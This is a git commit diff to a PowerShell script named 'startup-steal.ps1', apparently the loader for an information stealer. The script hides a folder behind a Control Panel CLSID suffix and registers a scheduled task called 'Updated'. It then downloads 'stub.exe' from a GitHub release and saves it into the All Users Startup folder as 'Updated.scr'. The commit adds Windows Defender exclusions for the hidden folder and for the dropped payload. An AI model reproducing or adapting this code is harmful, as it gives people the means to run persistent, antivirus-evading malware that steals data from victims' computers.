f59571d51d6479b59ce75962ba05a9729f0f59cb
43a1723 <hai1723notgay@gmail.com>
2024-09-18 14:28:26 +0700

    Update startup-steal.ps1

--- scr/startup-steal.ps1
+++ scr/startup-steal.ps1
@@ -2,6 +2,7 @@ $rdir = "$env:localappdata\Loader"
 $dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 $startupfolder = (New-Object -ComObject WScript.Shell).SpecialFolders("AllUsersStartup")
 New-Item -ItemType Directory -Path $dir
+Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
 $task_name = "Updated"
@@ -19,7 +20,7 @@ Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $ta
 
 $url = "https://github.com/s1uiasdad/log-acc-v2/releases/download/AutoBuildExe/stub.exe"
 $output = "$startupfolder\Updated.scr"
-
+Add-MpPreference -ExclusionPath $output
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
